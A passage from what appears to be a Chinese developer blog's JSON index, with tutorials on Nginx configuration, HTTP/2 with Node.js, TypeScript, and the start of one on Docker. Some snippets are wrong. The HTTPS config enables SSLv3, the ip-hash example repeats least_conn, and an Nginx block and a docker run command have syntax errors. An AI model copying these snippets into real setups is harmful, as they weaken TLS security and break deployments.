utf-8; location / &#123; # index 字段声明了解析的后缀名的先后顺序 # 下面匹配到/的时候默认找后缀名为 php 的文件，找不到再找 html，再找不到就找 htm index index.php index.html index.htm; # 自动索引 autoindex on; &#125; # 404 页面跳转到 404.html，相对于上面的 root 目录 error_page 404/404.html; # 403 页面跳转到 403.html，相对于上面的 root 目录 error_page 403/403.html; # 50x 页面跳转到 50x.html error_page 500 502 503 504/50x.html; location = /50x.html &#123; root html; &#125;&#125; 说明：Nginx 的配置项写法是第一个是配置项名称，其后面空格接值，最后以分号结束。上面的配置的意思就是：访问 http://localhost 的时候会在 /var/www/ 下面找 index.php 文件，如果没有找到就找 index.html，如果再没有找到那就找 index.htm，如果还是没有找到的话就 404 跳转到 404.html，如果你刚好将 /var/www/ 设置为 root 用户访问的话，那么就会直接无访问权限 403 跳转到 403.html。 路由nginx 对 location 的路由匹配规则是使用类似正则来匹配的。 语法：location [=|~|~*|^~] /uri/ 说明： = 这是完全匹配，后面的按照字符串处理。 ~* 当使用正则时，表示不分大小写。 ~ 当使用正则时，表示区分大小写（默认区分）。 ^~ 表示的是后面按照字符串处理（无视正则）。 1234location ~* /static/.*\\.(jpg|png|jpeg|gif|svg)$ &#123; root /static/image; autoindex on;&#125; 说明：使用了 ~* 指定了不区分大小写，然后匹配 /static/ 路径下的图片资源。 路由匹配是有优先级的： = 前缀的指令严格匹配这个查询，如果找到停止往下匹配。 常规字符串，长的在前，如果这个匹配使用 ^~ 前缀，匹配停止。 字符串或正则表达式，按配置文件的顺序。 如果第三步产生匹配，则使用这个结果并停止匹配，否则使用第二步的匹配结果。 示例： 1234567891011121314location = / &#123; # A # &#125;location / &#123; # B # &#125;location /static/ &#123; # C # &#125;location ^~ /images/ &#123; # D # &#125;location ~* \\.(jpg|png)$ &#123; # E # &#125;# 访问# / -&gt; A# /api -&gt; B# /static/a.html -&gt; C# /static/a.png -&gt; E# /image/a.html -&gt; D# /image/1.png -&gt; D# /123.png -&gt; E 说明：当访问 /123.png 时，先匹配到了 /，接着再匹配到了 ~* \\.(jpg|png)$。当访问 /image/1.png 时，先匹配到了 /，接着再匹配到了 ^~ /image/，因为使用了 ^~ 所以停止了匹配。 反向代理有时候，在内网里监听了很多个端口，但是只想外网只能访问 80 端口，那么可以使用 Nginx 做一个反向代理端口的行为。 123456789101112http &#123; # ... server &#123; listen 80; server_name localhost; location / &#123; proxy_pass http://localhost:3000; proxy_redirect: default; &#125; &#125;&#125; 说明：这样外网访问 80 端口时，nginx 把流量转给内网的 3000 端口，如果 3000 端口是 Nodejs 处理，那么 Nodejs 处理完成后会把 response 转发个 nginx，nginx 再响应为 80 端口。 静态服务很多时候，把静态资源交个 Nginx 去处理再合适不过。例如静态资源在 /static 路由下，单独配置一个 server 负责处理静态资源。 123456789101112http &#123; # ... server &#123; listen 80; server_name localhost; location /static/* &#123; root /static/; autoindex on; &#125; &#125;&#125; 说明：创建一个 server 专门负责静态资源，访问的路径是 /static/*，映射的目录是 /static/，并且是指定索引。 临时转跳有时候应用升级了，但是还是有用户会访问 v1 版本，为了方便过渡，可以使用临时转跳的方式，让 v1 的用户跳转到 v2 上。 123location /v1/ &#123; return 302 http://aotu.jd.com/v2/;&#125; 限制访问有时候，某个路由下的资源要开始不对外访问了，或者某些路由只能内网访问。 12345localhost = /admin &#123; allow 10.10.123.123; deny all; rewrite (.*) http://10.10.123.123:4000 # 重定向到对于页面&#125; 缓存Nginx 提供缓存功能，在这方面用于缓存静态资源是一个不错的选择。 12345678910server &#123; listen 80; server_name localhost; location ~ /static/image/.*\\.(?:jpg|jpeg|gif|png|ico|svg)$ &#123; root /static/image/; autoindex on; expires 7d; &#125;&#125; 说明：缓存的路径为 /static/image，缓存内容为图片，缓存时间为 7 天。 负载均衡当系统面临大量用户访问，负载过高的时候，通常会使用增加服务器数量来进行横向扩展，使用集群和负载均衡提高整个系统的处理能力。在多个应用实例间做负载均衡是一个被广泛使用的技术，用于优化资源效率，最大化吞吐量，减少延迟和容错。 Nginx 支持以下负载均衡机制（或者方法）： round-robin（轮询）：到应用服务器的请求以 round-robin 的方式被分发。 least-connected（最少连接）：下一个请求将被分派到活动连接数量最少的服务器。 ip-hash/IP（散列）：使用 hash 算法来决定下一个请求要选择哪个服务器（基于客户端 IP 地址）。 轮询123456789101112131415http &#123; upstream myapp &#123; server 192.168.1.1:3000; server 192.168.1.2:3000; server 192.168.1.3:3000; &#125; server &#123; listen 80; location / &#123; proxy_pass http://myapp; # 指定代理到 myapp 集群 &#125; &#125;&#125; 说明： upstream 用于定义服务器集群，在这里配置一个集群 myapp，里面有三个处理服务。所有请求被代理到服务器集群 myapp， 然后 nginx 实现 HTTP 负载均衡来分发请求。 最少连接使用最少连接负载均衡时，nginx 试图尽量不给已经很忙的应用服务器增加过度的请求， 而是分配新请求到不是那么忙的服务器实例。 nginx 中通过在服务器集群配置中使用 least_conn 指令来激活最少连接负载均衡方法： 123456upstream myapp &#123; least_conn; server 192.168.1.1:3000; server 192.168.1.2:3000; server 192.168.1.3:3000;&#125; 散列使用 ip-hash 时，客户端 ip 地址作为 hash key 使用，用来决策选择服务器集群中的哪个服务器来处理这个客户端的请求。这个方法保证从同一个客户端发起的请求总是定向到同一台服务器，除非服务器不可用。 123456upstream myapp &#123; least_conn; server 192.168.1.1:3000; server 192.168.1.2:3000; server 192.168.1.3:3000;&#125; 权重可以通过使用服务器权重来影响 nginx 的负载均衡算法。 12345upstream myapp &#123; server 192.168.1.1:3000 weight=3; server 192.168.1.2:3000; server 192.168.1.3:3000;&#125; 说明：默认情况下，特别是使用轮询，请求数是平均分配的。添加了权重后，比如 5 个请求，3 个会去 192.168.1.1，剩下 2 个平均分。 备用与停用如果某个服务器发生错误，不能提供服务，那么备用服务器将启动，否则备用服务器将不被唤醒。在某些时候，可以停用服务器。 12345678910upstream myapp &#123; server 192.168.1.1:3000 weight=3; server 192.168.1.2:3000; server 192.168.1.3:3000; server 192.168.1.4:3000 backup; # 以下两个为备用 server 192.168.1.5:3000 backup; server 192.168.1.6:3000 down; # 此服务端标记为停用&#125; HTTPS 与 HTTP/2配置 HTTPS 主机，必须在 server 配置块中打开 SSL 协议，还需要指定服务器端证书和密钥文件的位置： 12345678910111213141516171819worker_processes 4; # 工作进程个数http &#123; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; server &#123; listen 80; # 处理 http 和 https listen 443; server_name localhost; keepalive_timeout 70; ssl on; ssl_certificate /home/lizhooh/nginx/localhost.crt; # 公钥 ssl_certificate_key /home/lizhooh/nginx/localhost.key; # 私钥 ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers HIGH:!aNULL:!MD5; &#125;&#125; SSL 操作需要消耗 CPU 资源，所以在多处理器的系统，需要启动多个工作进程，而且数量需要不少于可用 CPU 的个数。 HTTP/2 是建立在 HTTPS 之上的，开启 HTTPS 之后可以开启 HTTP/2： 1234server &#123; listen 443 http2 default_server; # ...&#125; 案例比如用 Nodejs 启动了一个站点监听 3000 端口，用 a.famanoder.cn 来访问。 12345678server &#123; listen 80; server_name a.famanoder.cn; location / &#123; proxy_pass http://localhost:3000; &#125;&#125; 比如把所有的静态资源放到了 dist 目录，用 cdn.famanoder.cn 来访问。 123456789server &#123; listen 80; server_name cdn.famanoder.cn; location / &#123; index index.html; root D:\\sources\\dist; &#125;&#125; 用 vue 做的一个移动端的项目，用 m.famanoder.cn 来访问，所有数据接口由 famanoder.cn 提供。 12345678910111213server &#123; listen 80; server_name m.famanoder.cn; location /api &#123; proxy_pass https://famanoder.cn; &#125; location / &#123; index index.html; try_files $uri $uri/ /index.html; root D:/vue/dist; &#125;&#125; 参考资料 https://skyao.io/learning-nginx/ https://www.v2ex.com/t/387783?token=1312321#1213 http://tengine.taobao.org/nginx_docs/cn/docs/","categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://me.lizhooh.com/categories/Nginx/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nginx","slug":"Nginx","permalink":"http://me.lizhooh.com/tags/Nginx/"}]},{"title":"HTTP/2 综述","slug":"Nodejs/HTTP2/HTTP2 综述","date":"2018-03-22T00:49:43.000Z","updated":"2021-06-15T06:10:52.833Z","comments":true,"path":"/stories/2018/03/Nodejs/HTTP2/HTTP2 综述/","link":"","permalink":"http://me.lizhooh.com/stories/2018/03/Nodejs/HTTP2/HTTP2 综述/","excerpt":"前言对 TCP/IP 了解越深，往往会感叹其层次设计的巧妙。各种新出现的优化并不会破坏原有的体系结构，但是对 HTTP 的了解越深，越让人觉得它的过时。HTTP/2 是下一代的 HTTP 网络协议标准，在 2015 年正式发布。","text":"前言对 TCP/IP 了解越深，往往会感叹其层次设计的巧妙。各种新出现的优化并不会破坏原有的体系结构，但是对 HTTP 的了解越深，越让人觉得它的过时。HTTP/2 是下一代的 HTTP 网络协议标准，在 2015 年正式发布。 HTTP/1 的问题在说 HTTP/2 之前，先说一下 HTTP/1 遗留的问题。到目前为止，HTTP/1 已经走过了 20 年了，在这 20 年里 Web 的发展飞快，早就不适应现在技术的发展与需求。在 HTTP/1 里令人最关注的问题就是性能问题，就因为这样引出了很多 Web 性能优化的黑魔法。 现在来看看 HTTP/1 遗留的问题： 队列阻塞：HTTP/1 并未提供机制来同时请求多个资源，每个请求需要等待上一个请求完成才继续，这就是队列阻塞的问题。我们大多时候看到并发请求资源是浏览器开启多线程提供的能力，并不是 HTTP 协议所提供的能力。 抵效的 TCP 利用：HTTP/1 它是基于 TCP 的，每次连接都需要三次握手，并且 TCP 有一个慢启动的过程。 臃肿的消息首部：虽然 HTTP/1 提供了压缩被请求内容的机制，但是消息的首部却无法被压缩，这意味着需要更多的流量。 受限的优先级设置：如果浏览器针对域名开启了多个 socket 开始请求资源是，这时候浏览器能指定的请求优先级是有限制的。 为了解决这些问题，HTTP/2 因此而诞生。 HTTP/2 特点在 2012 年初，HTTP 工作组在制定 HTTP/2 时，被寄予了如下期望： 相比于使用 TCP 的 HTTP/1.1，最终用于可感知的多数延迟都有能够量化的显著改善。 解决 HTTP 中队头阻塞问题。 并行的实现机制不依赖与服务器建立多个连接，从而提升 TCP 连接的利用率。 保留 HTTP/1.1 的语义，可以利用已有的文档资源，包括 HTTP 方法、状态码、URI 和首部资源。 明确定义 HTTP/2 和 HTTP/1.1 交互方法，特别是通过中介时的方法。 明确指出它们可以被合理使用的新的扩展点和策略。 最后，在 2015 年发布的时候，HTTP/2 具有以下的特点： 二进制分帧：HTTP/2 在应用层跟传输层之间增加了一个二进制分帧层，突破 HTTP/1.1 的性能限制，改进传输性能。 多路复用：允许浏览器在一个 TCP 连接中包含多个请求，从而使得浏览器可以并行请求所有资源。 请求头压缩：所有的 HTTP/1.1 请求中必须要包含一些经常冗余的头信息，不过 H2 强制所有的 HTTP 报头以一种压缩的格式进行发送。 服务器推送：服务器可以在浏览器需要之前主动推送 web 资源 (CSS，JS， 图片)，这样可以减少请求数，提高页面加载速度。 串流优先：允许浏览器指定资源的优先级。比如，浏览器可以在所有样式和 JavaScript 之前优先请求 HTML 来渲染。 强制加密：与 HTTPS 一样，大多数主流浏览器需要使用 TLS。 二进制分帧 HTTP/2 会将所有传输的信息分割为更小的消息和帧，并对它们采用二进制格式的编码，其中 HTTP/1.1 的首部信息会被封装到 Headers 帧，而 request body 被封装到 Data 帧里面。 多路复用 在 HTTP/2 里允许并行的连接多个请求，从而使得浏览器可以并行请求所有资源，并且不管访问多少文件，也只建立一路连接。在这篇文章里有详细介绍 HTTP/2 多路复用，这里就不再叙述。 请求头压缩 HTTP/2 在 客户端 和 服务端 使用 首部表 来跟踪和存储之间发送的 键-值 对，对相同请求而言不需要再次发送请求和相应发送，通信期间几乎不会改变的通用 键-值 （如：用户代理、可接受的媒体类型）只需发送一次。 如果请求不包含首部（如：对同一资源的轮询请求），那首部开销为零字节。 如果首部发生变化，那只需发送变化的数据在 Headers 帧里面，新增或修改的首部帧会被追加到首部表。 性能这里有一个非常好的例子，能够很直观的看到 HTTP 与 HTTP/2 的性能差别。 HTTP vs HTTPS 无论如何 HTTP/2 的性能总是优于 HTTP/1 的。 证书HTTP/2 强制的要求使用 TLS，也就是说 HTTP/2 直接包括了 HTTPS 部分。 获取证书的方式有很多，这里不一一论述了，主要是如何获取一个用于在开发环境时使用。主要有以下几种方式： 使用 openssl 自签名证书。 1234567891011121314$ mkdir ssl$ cd ssl$ openssl genrsa -des3 -passout pass:x -out server.pass.key 2048$ openssl rsa -passin pass:x -in server.pass.key -out server.key# 写入 RSA 密钥$ rm server.pass.key$ openssl req -new -key server.key -out server.csr# 国家名 (2 个字母的代码) [AU]: US# 州或省名 (全名) [Some-State]: California# 一个复杂的密码 []:$ openssl x509 -req -sha256 -days 365 -in server.csr -signkey server.key -out server.crt 在线获取签名证书。 可以使用这个工具 CSR文件在线生成工具。 在 Let’s Encrypt 上获取。 如果是开发环境对证书无要求，建议是：在线获取签名证书。 展望HTTP/2 并不是一个完美的解决 HTTP 网络传输问题的方案，它仍然遗留着一些问题（RRT 问题）。那么会不会有 HTTP/3，它会怎样？这个问题是答案是无疑的，HTTP/3 一定会有，而且在性能问题上肯定是优于 HTTP/2。 除了单纯的 HTTP/2 之外，还有需要值得尝试的前瞻技术，如： QUIC：它提供 HTTP/2 等效的多路复用与流控，TLS 等效的安全机制，以及 TCP 等效的连接语义、可靠性、拥塞控制等。 TLS 1.3：TLS（传输层安全协议）是 HTTP/2 所需的加解密以及身份认证层。TLS 1.3 中最明显的改进就是新连接只需要一个往返时延（目前最少需要 3 次），如果连接恢复，并不需要往返时延。 Nodejs 上使用目前，Nodejs v9.0 开始对 HTTP/2 模块进行实验性开发。要在 Nodejs 上使用 HTTP/2 有几种方式： 使用内置的 http2 模块。 使用第三方 node-spdy 模块。 使用 nginx 代理 http2，Nodejs 处理自己的事情。 http2 模块由于现在 nodejs 的 http2 模块还是实验一阶段，暂时不考虑使用。 node-spdy下面介绍使用 node-spdy 模块构建 HTTP/2 服务。 12345678910111213141516171819202122232425const port = 4000;const spdy = require('spdy');const fs = require('fs');const Koa = require('koa');const Router = require('koa-router');const options = &#123; key: fs.readFileSync(__dirname + '/ssl/key.pem'), cert: fs.readFileSync(__dirname + '/ssl/cert.pem'),&#125;;const app = new Koa();const router = new Router();router.get('*', async ctx =&gt; &#123; ctx.body = &#123; message: 200 &#125;;&#125;);app.use(router.routes());spdy .createServer(options, app.callback()) .listen(port, (error) =&gt; &#123; console.log('Listening on port: ' + port + '.'); &#125;); 访问之后，很大可能会看到证书无效的问题，这时选择继续访问。 之后就可以看到请求的类型变成了 h2（注意到了没有！size 很小）。 nginx 代理 http2nginx 在 1.9 之后的版本支持 http2 模块。 具体配置 nginx/conf/nginx.conf 文件，之后就把端口代理给 Nodejs 即可。 12345server &#123; listen 8443 ssl http2 default_server; # 增加 http2 default_server server_name 192.168.0.107; ...&#125; 在之前应该是先成功配置了 HTTPS，再配置 HTTP/2。 参考资料 nginx 的 HTTP/2 性能太逆天了，HTTPS 网站性能优化 nginx 启用 HTTP/2 特性","categories":[{"name":"HTTP/2","slug":"HTTP-2","permalink":"http://me.lizhooh.com/categories/HTTP-2/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"HTTP/2","slug":"HTTP-2","permalink":"http://me.lizhooh.com/tags/HTTP-2/"}]},{"title":"拥抱与使用 Typescript","slug":"Typescript/拥抱与使用 Typescript","date":"2018-03-16T06:39:43.000Z","updated":"2021-06-15T06:10:52.898Z","comments":true,"path":"/stories/2018/03/Typescript/拥抱与使用 Typescript/","link":"","permalink":"http://me.lizhooh.com/stories/2018/03/Typescript/拥抱与使用 Typescript/","excerpt":"前言Typescript 是微软开源的一个 Javascript 的超集，提供更超前的语法（比 ES6 还超前）。 入门实际上从 ES6 转向 TS 只需要关注几个语法：类型、接口、泛型。其他语法基本和 ES6 差不多，甚至说是可以直接无视。 typescript 配置和 vscode 一起使用非常合适，毕竟它们都是微软自家的产品。","text":"前言Typescript 是微软开源的一个 Javascript 的超集，提供更超前的语法（比 ES6 还超前）。 入门实际上从 ES6 转向 TS 只需要关注几个语法：类型、接口、泛型。其他语法基本和 ES6 差不多，甚至说是可以直接无视。 typescript 配置和 vscode 一起使用非常合适，毕竟它们都是微软自家的产品。 类型typescript 最强大的是它的类型限制。从 ES6 转向 TS，可以先不关心类型，然后慢慢转向强类型。当然类型也并不需要全部都是强类型，有些没必要的可以不写类型，不然会显得很麻烦。 类型的用法是在定义、参数、返回值类使用 : 指定，类型分类是 Javascript 的基本类型，对于数组来说多了一个 []。 下面是一个 add 函数。 123function add(a, b) &#123; return a + b;&#125; 很明显当 a，b 不是数字类型时，得到的结果并不符合预期。 这时需要为参数添加类型： 123function add(a: number, b: number) &#123; return a + b;&#125; 当输入的参数不是数值类型时，TSLint 就会输出错误信息，这对于开发来说是非常友好的。 在 typescript 里使用 | 来标记多类型的情况。 1let a: number | number[] = [1]; 如果不写类型，那么效果就和 any 一样，TS 将不检查类型。 12let a = 2;let b: any = 2; 甚至可以指定函数类型，但是函数类型使用的是 Function 和不是 function，因为小写开头的是关键字。 123let func: Function ;func = (a, b) =&gt; a + b; 实际上最完整的强类型写法是： 1const func: Function = (a: number, b: number): number =&gt; a + b; 但我认为并不需要这样。 类型别名类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。 类型别名可以像接口一样，但是它们有些不同，其一，接口创建了一个新的名字，可以在其它任何地方使用。 类型别名并不创建新名字—比如，错误信息就不会使用别名。 在下面的示例代码里，在编译器中将鼠标悬停在 interfaced 上，显示它返回的是 Interface，但悬停在 aliased上时，显示的却是对象字面量类型。 123456789type Name = string; // Nametype Alias = &#123; num: number &#125;interface Interface &#123; num: number;&#125;function aliased(arg: Alias): Alias;function interfaced(arg: Interface): Interface; 类型断言通过类型断言这种方式可以告诉编译器，“相信我，我知道自己在干什么”。 类型断言好比其它语言里的类型转换，但是不进行特殊的数据检查和解构。 类型断言有两种形式。 其一是尖括号语法： 12let someValue: any = \"this is a string\";let strLength: number = (&lt;string&gt;someValue).length; 另一个为 as 语法： 12let someValue: any = \"this is a string\";let strLength: number = (someValue as string).length; 当在 TypeScript 里使用 JSX 时，只有 as 语法断言是被允许的。 接口接口的用法，大多情况用于定于数据的模型或者是一种结构性子类型化的约定，它并无其他用法。 例如定义一篇文章所需要的数据模型： 1234567891011121314151617interface commentSchema &#123; body: string, date: Date,&#125;interface blogSchema &#123; title: string, author: string, body: string, comments: commentSchema[], // 评论是一个数组。 date: Date, hidden?: boolean, // ？为可选属性。 meta: &#123; votes: number, favs: number &#125;,&#125; 定义好模型之后，就可以定义数据了（看到了没有？每个都有很好的类型提示！！！有红线，有木有！！！）： PS：也可以是这样的写法（, 与 ;）： 1234interface Props &#123; name: string, title: string;&#125; 如果只想定义部分属性，那么可以这样： 12345interface Props &#123; name: string, title: string, [rest: string]: any, // 剩下的为 any&#125; 函数类型的接口比较特别，这样定义它： 123interface SearchFunc &#123; (source: string, subString: string): boolean;&#125; 在变量里用 : 接口 的关系去映射，在类里用 implements 去实现接口。 123456789101112interface ClockInterface &#123; currentTime: Date; setTime(d: Date);&#125;class Clock implements ClockInterface &#123; currentTime: Date; setTime(d: Date) &#123; this.currentTime = d; &#125; constructor(h: number, m: number) &#123; &#125;&#125; 泛型泛型是对一类类型的抽象。 一个泛型可以这样定义： 12345function identity&lt;T&gt;(arg: T): T &#123; return arg;&#125;let output = identity&lt;string&gt;(\"myString\"); T 是一个泛型变量，可以有多个泛型变量，如：&lt;T, K&gt;。 泛型接口写法： 123interface State&lt;T&gt; &#123; // ...&#125; 泛型类写法： 123class State&lt;T&gt; &#123; // ...&#125; Nodejs 上使用 TS在 Nodejs 上使用 Typescript 需要做一些配置。 有三种方式： 直接使用 ts-node 代替 node 命令。 非常简单，使用 npm 安装 ts-node 后，直接 ts-node index.ts 即可。 使用 ts-node register。 123// start.js : node start.jsrequire('ts-node').register();require('./index.ts'); 使用 babel 配置 Typescript 环境。 12345678910111213require('babel-core/register')(&#123; ignore: [/node_modules/], presets: [ 'typescript', [ \"latest-node\", &#123; \"target\": \"current\" &#125; ] ]&#125;);require('babel-polyfill');require('./index'); 配置好之后可以愉快的玩起了。 1234567891011import * as Koa from 'koa';import * as Router from 'koa-router';const router = new Router();const app = new Koa();router.get('/', ctx =&gt; &#123; ctx.body = &#123; text: 'hello' &#125;;&#125;);app.use(router.routes()).listen(3000); PS：另外，记得把 @types/koa、 @types/koa-router 安装上。 React 上使用 TS在 React 上使用 TS 首先第一步是配置对 ts 的支持，其次是再考虑如何写 TS 语法。 配置基本不需要自己去考虑，因为在你之前已经有很多人在思考这个问题了。使用 create-react-app 创建项目需要加上一个参数来只支持 typescript。 1234567create-react-app my-app --scripts-version=react-scripts-tsCreating a new React app in G:\\React\\my-app.Installing packages. This might take a couple of minutes.Installing react, react-dom, and react-scripts-ts...yarn add v1.3.2 如果不想使用 create-react-app 也可以考虑使用 parcel，它是默认支持 typescript 的。 下面一个示例（来自 Ant design 的源码），显示如何从 ES6 React 迁移到 TS React。 123456789101112131415161718192021222324252627282930313233343536import * as React from 'react';export interface AlertProps &#123; type?: 'success' | 'info' | 'warning' | 'error'; closable?: boolean; closeText?: React.ReactNode; message: React.ReactNode; description?: React.ReactNode; onClose?: React.MouseEventHandler&lt;HTMLAnchorElement&gt;; afterClose?: () =&gt; void; showIcon?: boolean; iconType?: string; style?: React.CSSProperties; prefixCls?: string; className?: string; banner?: boolean;&#125;interface AlertState &#123; closing: boolean, closed: boolean,&#125;export default class Alert extends React.Component&lt;AlertProps, AlertState&gt; &#123; constructor(props: AlertProps) &#123; super(props); this.state = &#123; closing: true, closed: false, &#125;; &#125; // ... render() &#123; // ... &#125;&#125; 首先，在使用上可以说基本是差不多的，无非就是多了点类型，接口，泛型。 有如下的变化： 需要全部引入 React。 文件需要写成 .tsx 扩展，这时需要遵守 TS 的语法。如果是 js/jsx 那么遵守的是 ES6 的语法。 React.Component 函数变成了泛型，参数是 props 和 state，可以使用 any 指定为任意。 使用 interface 定义 props 和 state 的类型。 有必要的 props 使用类型限制住。 在引入模块的过程中如果出现类似的：Could not find a declaration file for module ‘react-redux’. 解决是：yarn add @types/react-redux。 TSLint &amp; TS 各种报错使用 create-react-app 创建项目后，编译时越到几个不喜欢的 TSLint 错误，当然我选择的是关闭它。 两个不喜欢的错误： The class method ‘render’ must be marked either ‘private’, ‘public’, or ‘protected’.（强制要写 public、private，这不就是变成了 Java 了吗？） interface name must start with a capitalized I.（接口强制 I 开头，太过分了。） Import sources within a group must be alphabetized.（尼玛，import 还要按字典排序，排你个卵球的。） require statement not part of an import statement. （不允许使用 require，有些库就没有 .d.ts 文件，那还玩个啥？） Calls to ‘console.log’ are not allowed. （不允许使用 console） The key ‘newState’ is not sorted alphabetically. （对象的 key 还要按字典排序，同理，排你个卵球的。） 在 tslint.json 里添加 rules： 12345678910111213&#123; // ... \"rules\": &#123; \"interface-name\": [true, \"never-prefix\"], \"member-access\": false, \"ordered-imports\": false, \"object-literal-sort-keys\": false, \"no-var-requires\": false, \"no-console\": false, \"arrow-parens\": false \"no-empty\": false &#125;&#125; tslint:recommended 的配置项在：https://github.com/palantir/tslint/tree/master/src/configs 当使用 window 对象时，报错：Property ‘xxx’ does not exist on type ‘Window’。此时改为 (window as any).xxx。 遇到这种错误，把 index.d.ts 删了吧。 12node_modules/redux-thunk/index.d.ts(4,47): Generic type 'Dispatch&lt;A, S&gt;' requires 2 type argument(s). 关于函数参数未指定类型时报错：Parameter ‘a’ implicitly has an ‘any’ type. 123function add(a, b) &#123; return a + b;&#125; 在 tsconfig.json 文件里，把 noImplicitAny 设置为 false。参考：tsconfig 文档 优缺点要知道做任何事情都会有优缺点，使用 typescript 能够把 Javascript 开发推向另一个高度，拥有类型系统、接口系统、泛型系统更有助于项目的迭代与维护，特别是它的静态类型检查功能。 但是会面临着几个问题： 团队需要更强大的技术能力。 代码与之前相比会多很多，代码会显得略长。 对于新手来说莫名奇妙的错误可以能会让人不知所措。 部分框架对 typescript 的支持不友好，导致智能提示的缺失。 typescript 通过编译成功兼容性 es5 代码，相对性能来说会比直接写 es5 要差。","categories":[{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/categories/Typescript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/tags/Typescript/"}]},{"title":"Docker 初识","slug":"Docker/Docker 初识","date":"2018-03-07T02:34:05.000Z","updated":"2021-06-15T06:10:52.809Z","comments":true,"path":"/stories/2018/03/Docker/Docker 初识/","link":"","permalink":"http://me.lizhooh.com/stories/2018/03/Docker/Docker 初识/","excerpt":"前言docker 是一个开源的应用容器引擎，可以为我们提供安全、可移植、可重复的自动化部署的方式。docker采用虚拟化的技术来虚拟化出应用程序的运行环境。","text":"前言docker 是一个开源的应用容器引擎，可以为我们提供安全、可移植、可重复的自动化部署的方式。docker采用虚拟化的技术来虚拟化出应用程序的运行环境。 使用 docker 有以下的优势： 每个部署的应用程序都是一个容器，彼此隔离，互不影响。 服务器只需要安装 docker 即可运行构建好的应用程序镜像，不会涉及复杂的服务器环境配置，因为配置都在特定的应用程序所在的镜像中去配置即可。 可以让开发环境与生产环境尽可能的保持一致。 简化了自动化部署和运维的繁琐流程，只需将构建好的镜像加载到服务器的 docker 中即可运行我们的应用程序。 可以充分利用服务器的系统资源，一台服务器上可以同时运行多个容器。 笔者的 liunx 是 Debian，安装部分参考文档即可。Dockerinfo docker 用户组每次运行 docker 时都需要高级权限，可以把当前用户添加到 docker 用户组里，这样就不用每次的 sudo 了。 1sudo usermod -aG docker lizhooh lizhooh 是用户名，添加用户组之后需要重启电脑。 Hello world!现在，使用 docker 里运行一个 Hello world!。 1docker run ubuntu:14.04 /bin/echo 'Hello world' 在这里指定了运行的环境是 ubuntu，指定版本是 14.04。使用 echo 输出 Hello world。执行命令后，docker 先会去下载镜像，之后就可以看到 Hello world 了。 Nodejs在 docker 上运行 Nodejs 应用，比较好的方式是在 vscode 上安装 docker 插件。 新建一个 Nodejs 应用，之后创建 Dockerfile： 接着 build： build 之后 run： 接着可以访问你的 Nodejs 应用了。 使用 Dockerfile 的方式，每次都需要重新编译。 Mongodb在上面使用 Dockerfile 的方式运行，这里直接从 dockerhub 里下载 Mongodb 的镜像。 123456789# 查找镜像docker search mongodocker pull mongo# 创建文件mkdir -p mongo/db# 启动实例docker run --name --rm mongo-test -d -p 27017:27017 -v $PWD/db:/data/db mongo 说明： --name 指定 docker 实例名称。 --rm 在容器停止时，自动删除容器，而不是遗留。 -d 实例在后台运行。 -p 进行端口映射。 -v 数据卷映射。把当前（pwd）路径下的 mongo/db 目录映射到容器的 /data/db 目录，作为 Mongodb 数据存储目录。 mongo 是运行的镜像名称。 之后可以使用 Mongodb Compass 连接，对于其他数据库如 redis，mysql 也是差不多这样。 DockerfileDockerfile 由一行行命令语句组成，并且支持以 # 开头的注释行。一般的，Dockerfile 分为四部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令。 例如这个 Dockerfile： 12345678910111213141516171819202122232425# 指定我们的基础镜像是 node，版本是 v9.0.0FROM node:9.0.0# 指定制作我们的镜像的联系人信息（镜像创建者）MAINTAINER Lizhooh# 将根目录下的文件都 copy 到 container（运行此镜像的容器）文件系统的 app 文件夹下ADD ./ /app/# cd 到 app 文件夹下WORKDIR /app# 安装项目依赖包RUN npm installRUN npm rebuild node-sass --force# 配置环境变量ENV HOST 0.0.0.0ENV PORT 8000# 容器对外暴露的端口号EXPOSE 8000# 容器启动时执行的命令，类似 npm run startCMD [\"npm\", \"start\"] 其中常用的命令有： FROM 语法：FROM &lt;image&gt;[:&lt;tag&gt;] 解释：设置要制作的镜像基于哪个镜像，FROM 指令必须是整个 Dockerfile 的第一个指令。 MAINTAINER 语法：MAINTAINER &lt;name&gt; 解释：MAINTAINER 指令允许你给将要制作的镜像设置作者信息。 ADD 语法：ADD &lt;src&gt; &lt;dest&gt; 解释：ADD 指令用于从指定路径拷贝一个文件或目录到容器的指定路径中，&lt;src&gt; 是一个文件或目录的路径，也可以是一个 url，路径是相对于该 Dockerfile 文件所在位置的相对路径，&lt;dest&gt; 是目标容器的一个绝对路径。 WORKDIR 语法：WORKDIR /path/to/workdir 解释：WORKDIR 指令用于设置 Dockerfile 中的 RUN、CMD 和 ENTRYPOINT 指令执行命令的工作目录（默认为根目录），该指令在 Dockerfile 文件中可以出现多次，如果使用相对路径则为相对于 WORKDIR 上一次的值，例如 WORKDIR /data，WORKDIR logs，RUN pwd 最终输出的当前目录是 /data/logs。 RUN 语法： RUN &lt;command&gt; 将会调用 /bin/sh -c &lt;command&gt;。 RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;] 将会调用 exec 执行，以避免有些时候 shell 方式执行时的传递参数问题，而且有些基础镜像可能不包含 /bin/sh。 解释：RUN 指令会在一个新的容器中执行任何命令，然后把执行后的改变提交到当前镜像，提交后的镜像会被用于 Dockerfile 中定义的下一步操作，RUN 中定义的命令会按顺序执行并提交，这正是 Docker 廉价的提交和可以基于镜像的任何一个历史点创建容器的好处，就像版本控制工具一样。 ENV 语法：ENV &lt;key&gt; &lt;value&gt; 解释：ENV 